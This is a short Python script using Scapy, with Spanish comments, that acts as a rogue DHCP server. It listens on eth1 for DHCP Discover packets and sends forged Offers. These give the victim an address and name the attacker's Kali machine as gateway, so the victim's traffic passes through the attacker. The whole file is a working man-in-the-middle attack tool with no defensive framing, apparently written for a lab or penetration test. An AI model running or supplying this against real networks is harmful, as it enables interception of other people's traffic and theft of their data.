#!/usr/bin/env python3
from scapy.all import *

# Configuración
iface = "eth1"
my_ip = "192.13.46.100"    # IP de tu Kali (Atacante)
fake_gw = "192.13.46.100"  # Te pones como Gateway
dns_fake = "8.8.8.8"        # DNS que quieres asignar
netmask = "255.255.255.0"

def handle_dhcp(packet):
    # Verificar si el paquete es DHCP y es un Discover (Type 1) o Request (Type 3)
    if DHCP in packet and packet[DHCP].options[0][1] == 1:
        print(f"[*] DHCP Discover detectado de: {packet[Ether].src}")
        
        # Crear la respuesta DHCP OFFER
        # Invertimos origen y destino (Ether/IP/UDP)
        
        ether = Ether(src=get_if_hwaddr(iface), dst=packet[Ether].src)
        ip = IP(src=my_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        
        # En BOOTP asignamos una IP falsa a la victima (yiaddr)
        # Ejemplo: Le damos la .50
        bootp = BOOTP(op=2, yiaddr="192.13.46.50", siaddr=my_ip, 
                      chaddr=packet[BOOTP].chaddr, xid=packet[BOOTP].xid)
        
        # Opciones DHCP críticas: Server ID, Lease Time, Subnet, Router (Gateway)
        dhcp = DHCP(options=[("message-type", "offer"),
                             ("server_id", my_ip),
                             ("lease_time", 1800),
                             ("subnet_mask", netmask),
                             ("router", fake_gw),
                             ("name_server", dns_fake),
                             "end"])
                             
        offer_packet = ether / ip / udp / bootp / dhcp
        sendp(offer_packet, iface=iface, verbose=0)
        print(f"[+] DHCP Offer enviado a {packet[Ether].src} asignando 192.13.46.50")

def start_rogue_server():
    print(f"[*] Escuchando peticiones DHCP en {iface}...")
    # Sniff filtra solo tráfico UDP puerto 67 (peticiones al servidor)
    sniff(filter="udp and (port 67 or 68)", prn=handle_dhcp, iface=iface)

if __name__ == "__main__":
    start_rogue_server()